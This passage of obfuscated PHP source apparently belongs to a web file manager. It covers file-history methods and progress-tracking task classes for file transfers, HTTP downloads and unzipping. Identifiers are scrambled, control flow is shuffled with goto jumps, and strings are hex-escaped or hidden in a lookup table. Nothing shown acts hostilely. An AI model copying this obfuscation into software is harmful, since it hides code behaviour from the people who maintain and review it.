"{$CàÔ§£­ƒ}\151\157\x5f\146\x69\154\145\x20\146\151\x6c\x65\x73\x20\x6f\x6e\40\146\151\154\x65\163\56\146\151\x6c\x65\x49\x44\40\x3d\40\x68\151\x73\x74\157\162\x79\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($BëÁ©™ï…³[2322])->where(array($BëÁ©™ï…³[385] => $FÆ‡¼ÏÉØî))->join($eğİõéçÓ, $BëÁ©™ï…³[2323])->find(); } public function removeItem($eèÉŸ•ª¤À) { $d‚ºÉ¾ØµŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¡Ç«„Ùª’ = array($d‚ºÉ¾ØµŞ[385] => $eèÉŸ•ª¤À); $eå§ÄÃÚĞË = $this->where($A¡Ç«„Ùª’)->find(); if ($eå§ÄÃÚĞË) { $BÅÉ¡›¼ŸÖ = $this->where($A¡Ç«„Ùª’)->delete(); Model($d‚ºÉ¾ØµŞ[422])->remove($eå§ÄÃÚĞË[$d‚ºÉ¾ØµŞ[419]]); return $BÅÉ¡›¼ŸÖ; } return !1; } public function removeBySource($AçÆ“¨ŒËæ) { goto F™Ê‹»¸äĞ; E±”²ìÁ×ç: $fé½®ë˜òó = array($C¶²—‘•ˆ[383] => array($C¶²—‘•ˆ[7], $AçÆ“¨ŒËæ)); $C²Ù°Ò‘Ö¿ = $this->field($C¶²—‘•ˆ[420])->where($fé½®ë˜òó)->select(); if ($C²Ù°Ò‘Ö¿) { $this->where($fé½®ë˜òó)->delete(); $aÀ˜¥»Á‚Ú = array_to_keyvalue($C²Ù°Ò‘Ö¿, $C¶²—‘•ˆ[33], $C¶²—‘•ˆ[419]); Model($C¶²—‘•ˆ[422])->remove($aÀ˜¥»Á‚Ú); } goto Dö×÷¶Ú¸; F™Ê‹»¸äĞ: $C¶²—‘•ˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$AçÆ“¨ŒËæ) { return !1; } if (!is_array($AçÆ“¨ŒËæ)) { $AçÆ“¨ŒËæ = array($AçÆ“¨ŒËæ); } goto E±”²ìÁ×ç; Dö×÷¶Ú¸: return !0; goto Bá¬”î‚‘; Bá¬”î‚‘: } public function setDetail($bò´£ô‹æ‚, $eĞÛÛÆçºÈ) { $fçÏ­¢¿Ñ¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return $this->where(array($fçÏ­¢¿Ñ¡[385] => $bò´£ô‹æ‚))->save(array($fçÏ­¢¿Ñ¡[2311] => $eĞÛÛÆçºÈ)); } public function rollbackToItem($e¸¦˜ÙÓ™, $EŞ÷‹¤åÃÑ) { goto D†Ù¾ì‰“; D¸“‡Û½ô: return $this->where(array($D¼é¸ƒ¹ºÖ[385] => $EŞ÷‹¤åÃÑ))->delete(); goto f—½ÆîÈï³; eÌ¯‡Ñ¬—ã: $b§¼–ÂŠ±¾ = $this->find($EŞ÷‹¤åÃÑ); $AóŞ…­ËÂŠ = array($D¼é¸ƒ¹ºÖ[419] => $b§¼–ÂŠ±¾[$D¼é¸ƒ¹ºÖ[419]], $D¼é¸ƒ¹ºÖ[77] => $b§¼–ÂŠ±¾[$D¼é¸ƒ¹ºÖ[77]], $D¼é¸ƒ¹ºÖ[107] => time(), $D¼é¸ƒ¹ºÖ[379] => USER_ID); Model($D¼é¸ƒ¹ºÖ[756])->where(array($D¼é¸ƒ¹ºÖ[369] => $e¸¦˜ÙÓ™))->save($AóŞ…­ËÂŠ); goto D¸“‡Û½ô; D†Ù¾ì‰“: $D¼é¸ƒ¹ºÖ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÃ†—š¼œ» = Model($D¼é¸ƒ¹ºÖ[756])->sourceInfo($e¸¦˜ÙÓ™); $this->addHistory($eÃ†—š¼œ»); goto eÌ¯‡Ñ¬—ã; f—½ÆîÈï³: } public function clearSame($BÛ‹Ö›»ì‘) { goto D§ºÀ‘ğ›; f­–‹ŒÔ¢½: if (!$eÂÊ‹›ôó) { return; } $this->where(array($AêàİÕ‘Ùß[367] => array($AêàİÕ‘Ùß[7], $eÂÊ‹›ôó)))->delete(); Model($AêàİÕ‘Ùß[422])->remove($eæŠŒĞ×óŒ); goto aÑ®ö°º¦; D§ºÀ‘ğ›: $AêàİÕ‘Ùß =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bá÷·ğ‡ = $this->listData($BÛ‹Ö›»ì‘); $EÄ³óŸÌğˆ = array_to_keyvalue_group($bá÷·ğ‡, $AêàİÕ‘Ùß[419]); goto B¯œ¿î°Ñ; B¯œ¿î°Ñ: $eæŠŒĞ×óŒ = array(); $eÂÊ‹›ôó = array(); foreach ($EÄ³óŸÌğˆ as $e¦§¶Îö™š) { if (!$e¦§¶Îö™š || count($e¦§¶Îö™š) <= 1) { continue; } foreach ($e¦§¶Îö™š as $FÍ£ëÊ³ÔŠ) { $eæŠŒĞ×óŒ[] = $FÍ£ëÊ³ÔŠ[$AêàİÕ‘Ùß[419]]; $eÂÊ‹›ôó[] = $FÍ£ëÊ³ÔŠ[$AêàİÕ‘Ùß[367]]; } } goto f­–‹ŒÔ¢½; aÑ®ö°º¦: } public function userSpace() { $DÛºƒØ³½è =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D‹—ÉÏÁ¾ = $this->tablePrefix; $F¼èŠºœ¸® = array($DÛºƒØ³½è[1436] => USER_ID); $BÀÊŞÊ¡ª¥ = "{$D‹—ÉÏÁ¾}\x69\x6f\x5f\x66\x69\x6c\145\40\146\x69\154\x65\163\40\157\156\40\146\x69\x6c\145\163\x2e\146\151\154\145\111\x44\x20\x3d\x20\150\x69\163\164\x6f\x72\x79\56\146\151\154\x65\111\104"; return $this->alias($DÛºƒØ³½è[2322])->where($F¼èŠºœ¸®)->join($BÀÊŞÊ¡ª¥, $DÛºƒØ³½è[2323])->sum($DÛºƒØ³½è[77]); } } goto A‰­òä¹´; bß¸¢…Æë: class TaskFileTransfer extends Task { protected function startAfter() { goto bÍÄÌ˜ˆ‹; aœÓ´®ÖÙØ: Hook::bind($bÆŠôÖ²‹«[511], array($this, $bÆŠôÖ²‹«[1478])); Hook::bind($bÆŠôÖ²‹«[513], array($this, $bÆŠôÖ²‹«[1478])); Hook::bind($bÆŠôÖ²‹«[515], array($this, $bÆŠôÖ²‹«[1478])); goto Bô”Î¨‚; d«õïäˆ§…: Hook::bind($bÆŠôÖ²‹«[543], array($this, $bÆŠôÖ²‹«[1477])); Hook::bind($bÆŠôÖ²‹«[509], array($this, $bÆŠôÖ²‹«[1478])); Hook::bind($bÆŠôÖ²‹«[506], array($this, $bÆŠôÖ²‹«[1478])); goto aœÓ´®ÖÙØ; BËôØ°­—‚: Hook::bind($bÆŠôÖ²‹«[539], array($this, $bÆŠôÖ²‹«[1475])); Hook::bind($bÆŠôÖ²‹«[540], array($this, $bÆŠôÖ²‹«[1476])); Hook::bind($bÆŠôÖ²‹«[542], array($this, $bÆŠôÖ²‹«[1477])); goto d«õïäˆ§…; Bô”Î¨‚: Hook::bind($bÆŠôÖ²‹«[1479], array($this, $bÆŠôÖ²‹«[1480])); Hook::bind($bÆŠôÖ²‹«[532], array($this, $bÆŠôÖ²‹«[1481])); $this->sourceModelCopyFlag = !1; goto aæéç®Ÿ©—; aæéç®Ÿ©—: Hook::bind($bÆŠôÖ²‹«[1482], array($this, $bÆŠôÖ²‹«[1483])); Hook::bind($bÆŠôÖ²‹«[1484], array($this, $bÆŠôÖ²‹«[1485])); Hook::bind($bÆŠôÖ²‹«[1486], array($this, $bÆŠôÖ²‹«[1487])); goto C‰£İ¬êÅ‰; Dèé‘„ì„Ü: $A¶˜³œ–[$bÆŠôÖ²‹«[1494]] = 0; $A¶˜³œ–[$bÆŠôÖ²‹«[1495]] = 0; if (!$A¶˜³œ–[$bÆŠôÖ²‹«[1351]]) { $A¶˜³œ–[$bÆŠôÖ²‹«[1351]] = LNG($bÆŠôÖ²‹«[1496]); } goto e‹ÄŒ¬ÄŒ”; Eâ×Í¼ó‰õ: $A¶˜³œ–[$bÆŠôÖ²‹«[982]] = $bÆŠôÖ²‹«[33]; $A¶˜³œ–[$bÆŠôÖ²‹«[1492]] = $bÆŠôÖ²‹«[33]; $A¶˜³œ–[$bÆŠôÖ²‹«[1493]] = 0; goto Dèé‘„ì„Ü; D•±ÃŸÎµä: Hook::bind($bÆŠôÖ²‹«[1469], array($this, $bÆŠôÖ²‹«[1470])); Hook::bind($bÆŠôÖ²‹«[1471], array($this, $bÆŠôÖ²‹«[1472])); Hook::bind($bÆŠôÖ²‹«[1473], array($this, $bÆŠôÖ²‹«[1474])); goto BËôØ°­—‚; bÍÄÌ˜ˆ‹: $bÆŠôÖ²‹« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¶˜³œ– =& $this->task; $this->sourceCopyFolder = !1; goto D•±ÃŸÎµä; C‰£İ¬êÅ‰: $A¶˜³œ–[$bÆŠôÖ²‹«[1488]] = LNG($bÆŠôÖ²‹«[1489]); $A¶˜³œ–[$bÆŠôÖ²‹«[1490]] = 0; $A¶˜³œ–[$bÆŠôÖ²‹«[1491]] = 0; goto Eâ×Í¼ó‰õ; e‹ÄŒ¬ÄŒ”: } protected function endAfter() { goto c™ø“ÓğÁ; Dë±œÃÇÉ: Hook::unbind($BÕ…İµàõ[1473], array($this, $BÕ…İµàõ[1474])); Hook::unbind($BÕ…İµàõ[539], array($this, $BÕ…İµàõ[1475])); Hook::unbind($BÕ…İµàõ[540], array($this, $BÕ…İµàõ[1476])); goto DÒ×¡ùßÅ; FÏíÆ¹‘’: Hook::unbind($BÕ…İµàõ[515], array($this, $BÕ…İµàõ[1478])); Hook::unbind($BÕ…İµàõ[1479], array($this, $BÕ…İµàõ[1480])); Hook::unbind($BÕ…İµàõ[532], array($this, $BÕ…İµàõ[1481])); goto F…¶±®—ã; c™ø“ÓğÁ: $BÕ…İµàõ =& $_SERVER[³‘’¼äÑ™ÔÍ]; Hook::unbind($BÕ…İµàõ[1469], array($this, $BÕ…İµàõ[1470])); Hook::unbind($BÕ…İµàõ[1471], array($this, $BÕ…İµàõ[1472])); goto Dë±œÃÇÉ; d®Á²®˜ƒŠ: Hook::unbind($BÕ…İµàõ[506], array($this, $BÕ…İµàõ[1478])); Hook::unbind($BÕ…İµàõ[511], array($this, $BÕ…İµàõ[1478])); Hook::unbind($BÕ…İµàõ[513], array($this, $BÕ…İµàõ[1478])); goto FÏíÆ¹‘’; F…¶±®—ã: Hook::unbind($BÕ…İµàõ[1482], array($this, $BÕ…İµàõ[1483])); Hook::unbind($BÕ…İµàõ[1484], array($this, $BÕ…İµàõ[1485])); Hook::unbind($BÕ…İµàõ[1486], array($this, $BÕ…İµàõ[1487])); goto dÃ¼‚í­‡; DÒ×¡ùßÅ: Hook::unbind($BÕ…İµàõ[542], array($this, $BÕ…İµàõ[1477])); Hook::unbind($BÕ…İµàõ[543], array($this, $BÕ…İµàõ[1477])); Hook::unbind($BÕ…İµàõ[509], array($this, $BÕ…İµàõ[1478])); goto d®Á²®˜ƒŠ; dÃ¼‚í­‡: } public function copyMoveStart($Cè–âÁë, $c™‘ñÙèù , $a©¨ãÆª´«, $AË‰‰ïæË) { goto AòÕùëÆá; AòÕùëÆá: $aöò¬â²¤È =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::log($aöò¬â²¤È[1497] . $c™‘ñÙèù  . $aöò¬â²¤È[66] . $AË‰‰ïæË); $D‹Ÿ¿Ï½†Ç = rtrim(TEMP_FILES, $aöò¬â²¤È[8]); goto dòÎ±½¸©ã; dòÎ±½¸©ã: if (substr($c™‘ñÙèù , 0, strlen($D‹Ÿ¿Ï½†Ç)) == $D‹Ÿ¿Ï½†Ç) { return; } if (substr($AË‰‰ïæË, 0, strlen($D‹Ÿ¿Ï½†Ç)) == $D‹Ÿ¿Ï½†Ç) { return; } $CÍä¼œîß =& $this->task; goto aî‡È«¶¬¢; aî‡È«¶¬¢: $CÍä¼œîß[$aöò¬â²¤È[1498]] = KodIO::transferType($Cè–âÁë, $a©¨ãÆª´«); $this->update(); goto f¹íØ® ‚Ô; f¹íØ® ‚Ô: } public function updateAfter() { goto A†‡ÊÌÔù; A†‡ÊÌÔù: $f×ÙÁœ Íã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e¾µñŸ‘Ú =& $this->task; if (!$e¾µñŸ‘Ú[$f×ÙÁœ Íã[701]]) { return; } goto B‹³æ­Œ–Á; e™âÃ”¬¬Ä: $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1446]] = $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1495]] / $e¾µñŸ‘Ú[$f×ÙÁœ Íã[701]]; if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1446]] > 0) { $E„õ¸âÔø¥ = timeFloat() - $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1448]] - $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1451]]; $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1452]] = $E„õ¸âÔø¥ * (1 - $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1446]]) / $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1446]]; } goto Dù°‘áÒ–Ç; B‹³æ­Œ–Á: if ($this->sourceModelCopyFlag) { return; } if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1498]] == $f×ÙÁœ Íã[1098]) { return; } if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1498]] == $f×ÙÁœ Íã[1044] || $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1498]] == $f×ÙÁœ Íã[103]) { if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1492]]) { $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1495]] = $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1494]] + $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1491]]; } } else { if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1498]] == $f×ÙÁœ Íã[1099]) { if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1492]] == $f×ÙÁœ Íã[1044]) { $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1495]] = $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1494]] + $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1491]] * 0.5; } else { if ($e¾µñŸ‘Ú[$f×ÙÁœ Íã[1492]] == $f×ÙÁœ Íã[103]) { $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1495]] = $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1494]] + $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1490]] * 0.5 + $e¾µñŸ‘Ú[$f×ÙÁœ Íã[1491]] * 0.5; } } } } goto e™âÃ”¬¬Ä; Dù°‘áÒ–Ç: } public function addPath($aß˜¡™ôÊ) { goto FÜÑ­ÜŒŠ; eºå®œÑÙ›: if ($AäÅˆÅˆ‡·[$AªØ»™öÛĞ[29]] == $AªØ»™öÛĞ[167]) { $eÑ¸‡´ä [$AªØ»™öÛĞ[980]] += 1; } else { $eÑ¸‡´ä [$AªØ»™öÛĞ[980]] += $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[80]][$AªØ»™öÛĞ[78]]; if ($AäÅˆÅˆ‡·[$AªØ»™öÛĞ[369]]) { $eÑ¸‡´ä [$AªØ»™öÛĞ[980]] += $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[80]][$AªØ»™öÛĞ[79]] + 1; } } $eÑ¸‡´ä [$AªØ»™öÛĞ[701]] += $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[77]]; $this->update(); goto cîôÉòÂù; FÜÑ­ÜŒŠ: $AªØ»™öÛĞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$aß˜¡™ôÊ) { return; } $eÑ¸‡´ä  =& $this->task; goto B™£îö¹ÙĞ; B™£îö¹ÙĞ: $AäÅˆÅˆ‡· = IO::infoWithChildren($aß˜¡™ôÊ); $E¯ĞÇÖ‡ìŠ = $eÑ¸‡´ä [$AªØ»™öÛĞ[1499]] ? $eÑ¸‡´ä [$AªØ»™öÛĞ[1499]][$AªØ»™öÛĞ[1500]] : 0; $eÑ¸‡´ä [$AªØ»™öÛĞ[1499]] = array($AªØ»™öÛĞ[1500] => $E¯ĞÇÖ‡ìŠ + 1, $AªØ»™öÛĞ[386] => $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[28]], $AªØ»™öÛĞ[75] => $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[75]], $AªØ»™öÛĞ[466] => $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[466]] ? $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[466]] : $AäÅˆÅˆ‡·[$AªØ»™öÛĞ[75]]); goto eºå®œÑÙ›; cîôÉòÂù: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Dñí‘ºÏŠ) { $aØæ¥Ÿ®ËÇ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÂì±¶İ¿× =& $this->task; $dÂì±¶İ¿×[$aØæ¥Ÿ®ËÇ[1488]] = $Dñí‘ºÏŠ[$aØæ¥Ÿ®ËÇ[28]]; $dÂì±¶İ¿×[$aØæ¥Ÿ®ËÇ[982]] = $Dñí‘ºÏŠ[$aØæ¥Ÿ®ËÇ[28]]; $this->update(); } public function copyFileStart($b¿Ï¢–ÕİØ, $c‘ƒéŒ¨ ³, $fÜ²ÃË…ßÈ, $cñ‡°°ÁÉÂ, $D±á¿ÒìÙ, $eÀ¹ÇŒ‰º) { goto céÛØƒ³³ì; d©ëÑîà­¼: $fÁ¬ñµ·†[$Eêšß…­Ù [1488]] = $Bóğ†¡ÚÒÕ; $fÁ¬ñµ·†[$Eêšß…­Ù [1490]] = (int) $b¿Ï¢–ÕİØ->size($c‘ƒéŒ¨ ³); $fÁ¬ñµ·†[$Eêšß…­Ù [1491]] = 0; goto f„òÄßë‡š; A‚‘òÄø“»: $this->update(); goto EĞ¡¢İ‡Ş; EÁŸ¿…åÑ: $GLOBALS[$Eêšß…­Ù [1502]] = $D±á¿ÒìÙ; $GLOBALS[$Eêšß…­Ù [1501]] = $eÀ¹ÇŒ‰º; $fÁ¬ñµ·† =& $this->task; goto d©ëÑîà­¼; céÛØƒ³³ì: $Eêšß…­Ù  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bóğ†¡ÚÒÕ = $D±á¿ÒìÙ; if ($Bóğ†¡ÚÒÕ == $GLOBALS[$Eêšß…­Ù [1501]]) { $Bóğ†¡ÚÒÕ = $GLOBALS[$Eêšß…­Ù [1502]]; } goto EÁŸ¿…åÑ; f„òÄßë‡š: $fÁ¬ñµ·†[$Eêšß…­Ù [982]] = $Eêšß…­Ù [33]; $fÁ¬ñµ·†[$Eêšß…­Ù [1492]] = $Eêšß…­Ù [33]; $fÁ¬ñµ·†[$Eêšß…­Ù [1493]] = 0; goto A‚‘òÄø“»; EĞ¡¢İ‡Ş: } public function copyFileEnd($C´İĞ‹®ÀÎ, $dçÈî×‰Ôî, $B’ñãÀîñ„, $e×†Şæ²ä„, $BÑãçÍêÑ, $Aù¨œ†Ä‡¿) { $F‰šÎÎµ’„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BÏá‚³×øŞ =& $this->task; $BÏá‚³×øŞ[$F‰šÎÎµ’„[1491]] = $BÏá‚³×øŞ[$F‰šÎÎµ’„[1490]]; $BÏá‚³×øŞ[$F‰šÎÎµ’„[1492]] = $F‰šÎÎµ’„[33]; if ($BÑãçÍêÑ == $BÏá‚³×øŞ[$F‰šÎÎµ’„[1488]]) { $BÏá‚³×øŞ[$F‰šÎÎµ’„[1494]] += $BÏá‚³×øŞ[$F‰šÎÎµ’„[1490]]; $BÏá‚³×øŞ[$F‰šÎÎµ’„[1495]] = $BÏá‚³×øŞ[$F‰šÎÎµ’„[1494]]; $this->update(1); } else { $this->update(); $BÏá‚³×øŞ[$F‰šÎÎµ’„[1491]] = 0; } self::log($F‰šÎÎµ’„[1503] . $dçÈî×‰Ôî . $F‰šÎÎµ’„[66] . $e×†Şæ²ä„ . $F‰šÎÎµ’„[217] . $BÑãçÍêÑ . $F‰šÎÎµ’„[1504] . $BÏá‚³×øŞ[$F‰šÎÎµ’„[1488]]); } public function updateFileEnd($fğ»âå¼‡è, $FõÚá¼‚Ü) { goto c ×‚¹ï…Ş; b¬ÕÄËµ: $this->update(1); self::log($EØà‘ï²·¹[1505] . $fğ»âå¼‡è); goto açˆ¾«äœ; CìÂ›ìÄÎ¡: $A¼Š·å ‘Ê[$EØà‘ï²·¹[1490]] = $FõÚá¼‚Ü; $A¼Š·å ‘Ê[$EØà‘ï²·¹[1494]] += $FõÚá¼‚Ü; $A¼Š·å ‘Ê[$EØà‘ï²·¹[1495]] = $A¼Š·å ‘Ê[$EØà‘ï²·¹[1494]]; goto b¬ÕÄËµ; c ×‚¹ï…Ş: $EØà‘ï²·¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¼Š·å ‘Ê =& $this->task; $A¼Š·å ‘Ê[$EØà‘ï²·¹[1488]] = $fğ»âå¼‡è; goto CìÂ›ìÄÎ¡; açˆ¾«äœ: } public function sourceModelCopy($CĞÊæâæó©) { goto e¨ÖæÒ•Íõ; d‰Öœ„˜šœ: $bøµœ¢³óæ =& $this->task; $this->sourceModelCopyFlag = !0; $Aø¼†¢Ûçö = 0; goto f”Šù‘§ˆ; e¨ÖæÒ•Íõ: $a²Æ¦«Î‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DãŠŠ°·š‰ = $CĞÊæâæó©[0]; $d—œó·« = $CĞÊæâæó©[1]; goto d‰Öœ„˜šœ; f”Šù‘§ˆ: switch ($DãŠŠ°·š‰) { case $a²Æ¦«Î‰[507]: $Aø¼†¢Ûçö = 1; break; case $a²Æ¦«Î‰[510]: $bøµœ¢³óæ[$a²Æ¦«Î‰[1488]] = $d—œó·«[$a²Æ¦«Î‰[28]]; break; case $a²Æ¦«Î‰[512]: $Aø¼†¢Ûçö = intval($CĞÊæâæó©[$a²Æ¦«Î‰[363]] * 0.4); break; case $a²Æ¦«Î‰[514]: $Aø¼†¢Ûçö = intval($CĞÊæâæó©[$a²Æ¦«Î‰[363]] * 0.2); break; case $a²Æ¦«Î‰[516]: $Aø¼†¢Ûçö = intval($CĞÊæâæó©[$a²Æ¦«Î‰[363]] * 0.4); break; } $this->update($Aø¼†¢Ûçö); $this->sourceModelCopyFlag = !1; goto bÁŠ–Ú…Š¶; bÁŠ–Ú…Š¶: } public function sourceRemove($d½­§Œï†Ã, $a«¢†µ¥ã) { $CİôŸŒ “ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->sourceModelCopyFlag = !0; $d¡­ÒÑê— = 1; if (isset($d½­§Œï†Ã[$CİôŸŒ “ï[80]])) { $d¡­ÒÑê— = $d½­§Œï†Ã[$CİôŸŒ “ï[80]][$CİôŸŒ “ï[78]] + $d½­§Œï†Ã[$CİôŸŒ “ï[80]][$CİôŸŒ “ï[79]] + 1; } $this->update($d¡­ÒÑê—); $this->sourceModelCopyFlag = !1; } public function sourceMove($DŒ“×´ÚÁö) { $this->sourceRemove($DŒ“×´ÚÁö, !1); } public function curlProgress($a±“¬®‘Š, $e‘‰§¾ô‚Ñ, $Cğèã‡ê±, $FÑÊÜ®» Á, $DëÜóÕ§‡Ì) { $c±¸Œ§ áâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AËğ„¼Î…· =& $this->task; if ($DëÜóÕ§‡Ì > 0) { $AËğ„¼Î…·[$c±¸Œ§ áâ[982]] = $c±¸Œ§ áâ[1506]; $AËğ„¼Î…·[$c±¸Œ§ áâ[1492]] = $c±¸Œ§ áâ[103]; if ($AËğ„¼Î…·[$c±¸Œ§ áâ[1490]] == $FÑÊÜ®» Á || $FÑÊÜ®» Á > 1024 * 1024) { $AËğ„¼Î…·[$c±¸Œ§ áâ[1491]] = $DëÜóÕ§‡Ì; } if ($AËğ„¼Î…·[$c±¸Œ§ áâ[1493]]) { $AËğ„¼Î…·[$c±¸Œ§ áâ[1491]] = $DëÜóÕ§‡Ì + $AËğ„¼Î…·[$c±¸Œ§ áâ[1493]]; } } else { if ($Cğèã‡ê± > 0) { if ($AËğ„¼Î…·[$c±¸Œ§ áâ[1490]] == $e‘‰§¾ô‚Ñ) { $AËğ„¼Î…·[$c±¸Œ§ áâ[1491]] = $Cğèã‡ê±; $AËğ„¼Î…·[$c±¸Œ§ áâ[982]] = $c±¸Œ§ áâ[1507]; $AËğ„¼Î…·[$c±¸Œ§ áâ[1492]] = $c±¸Œ§ áâ[1044]; } } } $this->update(); } public function curlProgressStart($döèŠ½ôˆï) { } public function curlProgressEnd($A¿½­©Ğ“å) { $C“æÃØÛÕ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b—¥šçŞö =& $this->task; $AÎ‰Ö‰ = curl_getinfo($A¿½­©Ğ“å); $F»‹‡ñŠôš = $AÎ‰Ö‰[$C“æÃØÛÕ[1508]]; if ($b—¥šçŞö[$C“æÃØÛÕ[1492]] == $C“æÃØÛÕ[103] && $F»‹‡ñŠôš) { $b—¥šçŞö[$C“æÃØÛÕ[1493]] += $F»‹‡ñŠôš; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $A‚¢ß¯¤Ñ¾ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a²÷ ¡İ’© =& $this->task; $a²÷ ¡İ’©[$A‚¢ß¯¤Ñ¾[1509]] = 1; Hook::bind($A‚¢ß¯¤Ñ¾[1482], array($this, $A‚¢ß¯¤Ñ¾[1510])); Hook::bind($A‚¢ß¯¤Ñ¾[1484], array($this, $A‚¢ß¯¤Ñ¾[1511])); Hook::bind($A‚¢ß¯¤Ñ¾[1486], array($this, $A‚¢ß¯¤Ñ¾[1512])); } protected function endAfter() { $b—˜¯ôà¤÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; Hook::unbind($b—˜¯ôà¤÷[1482], array($this, $b—˜¯ôà¤÷[1510])); Hook::unbind($b—˜¯ôà¤÷[1484], array($this, $b—˜¯ôà¤÷[1511])); Hook::unbind($b—˜¯ôà¤÷[1486], array($this, $b—˜¯ôà¤÷[1512])); } public function progressStart($Bä¾½†÷œ…) { $FĞî›ÈÅ£‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÍÈ§ô¦¢ = curl_getinfo($Bä¾½†÷œ…); self::log($FĞî›ÈÅ£‹[1513] . $CÍÈ§ô¦¢[$FĞî›ÈÅ£‹[295]]); self::valueSet($this->task[$FĞî›ÈÅ£‹[367]], $this->task); } public function progressEnd($a¨ƒñáßŞÖ) { $d†‰ºìÄö¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::log($d†‰ºìÄö¨[1514] . $this->task[$d†‰ºìÄö¨[367]]); $this->end(); } public function progress($cÊÌ±‰‡², $D¾¨®—¢°, $c¯‰ÜìÊµÁ, $fôÚ†²ŒŒ, $b¶¶ÊÙ¤) { $a†´»È¿Óù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b‰Õïä•İ½ =& $this->task; if ($b¶¶ÊÙ¤ > 0) { $b‰Õïä•İ½[$a†´»È¿Óù[980]] = $b‰Õïä•İ½[$a†´»È¿Óù[980]] == 0 ? $fôÚ†²ŒŒ : $b‰Õïä•İ½[$a†´»È¿Óù[980]]; $b‰Õïä•İ½[$a†´»È¿Óù[994]] = $b¶¶ÊÙ¤; } else { if ($c¯‰ÜìÊµÁ > 0) { $b‰Õïä•İ½[$a†´»È¿Óù[980]] = $b‰Õïä•İ½[$a†´»È¿Óù[980]] == 0 ? $D¾¨®—¢° : $b‰Õïä•İ½[$a†´»È¿Óù[980]]; $b‰Õïä•İ½[$a†´»È¿Óù[994]] = $c¯‰ÜìÊµÁ; } } $this->update(); self::log("\x70\162\x6f\147\x72\x65\163\163\x48\x74\x74\x70\72\x64\x6f\x77\156\x3a{$c¯‰ÜìÊµÁ}\x2f{$D¾¨®—¢°}\73\x20\x75\160\x6c\157\141\144\72{$b¶¶ÊÙ¤}\57{$fôÚ†²ŒŒ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto a‡ğÑš¾¼; a‡ğÑš¾¼: $a¢›ÂÍ’ÕÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; parent::startAfter(); Hook::bind($a¢›ÂÍ’ÕÈ[1515], array($this, $a¢›ÂÍ’ÕÈ[1516])); goto B‡º ŒáÈ; D‘¬®›ÙÆ›: if (!$fÃöì¤£Ø£[$a¢›ÂÍ’ÕÈ[1351]]) { $fÃöì¤£Ø£[$a¢›ÂÍ’ÕÈ[1351]] = LNG($a¢›ÂÍ’ÕÈ[1519]); } goto b¬ÍŒ¸Ä°; B‡º ŒáÈ: Hook::bind($a¢›ÂÍ’ÕÈ[1039], array($this, $a¢›ÂÍ’ÕÈ[1517])); $fÃöì¤£Ø£ =& $this->task; $fÃöì¤£Ø£[$a¢›ÂÍ’ÕÈ[1518]] = $a¢›ÂÍ’ÕÈ[1044]; goto D‘¬®›ÙÆ›; b¬ÍŒ¸Ä°: } protected function endAfter() { $FÁ®¢º¥Ö =& $_SERVER[³‘’¼äÑ™ÔÍ]; parent::endAfter(); Hook::unbind($FÁ®¢º¥Ö[1515], array($this, $FÁ®¢º¥Ö[1516])); Hook::unbind($FÁ®¢º¥Ö[1039], array($this, $FÁ®¢º¥Ö[1517])); } public function updateAfter() { $b‹ãˆãôï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‘ï”ºö¨ï =& $this->task; if (!$C‘ï”ºö¨ï[$b‹ãˆãôï[980]] || 